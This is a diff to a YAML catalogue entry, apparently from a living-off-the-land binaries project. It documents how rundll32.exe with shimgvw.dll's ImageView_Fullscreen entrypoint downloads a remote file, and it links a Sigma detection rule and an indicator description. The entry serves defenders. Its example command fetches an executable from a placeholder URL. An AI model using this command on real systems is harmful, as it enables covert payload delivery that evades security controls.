@@ -41,7 +41,9 @@ resource_profile:
 allowed-tools:
 - shimgvw
 parameters: []
-features: []
+features:
+- network-intensive
+- pipes-stdout
 execution:
   template: shimgvw
   sandbox: execFile
@@ -49,7 +51,9 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'. (Download file from remote location.)
+- description: Once executed, rundll32.exe will download the file at the URL in the
+    command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.
+    (Download file from remote location.)
   command: rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
 references:
 - label: '1479080793003671557'
@@ -62,14 +66,14 @@ detections:
 - type: sigma
   url: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
 - type: ioc
-  description: Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol handler ('://') on the command line
+  description: Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol
+    handler ('://') on the command line
 install:
 - method: choco
   package_name: shimgvw
   commands:
   - choco install shimgvw
 ---
-
 
 # shimgvw
 
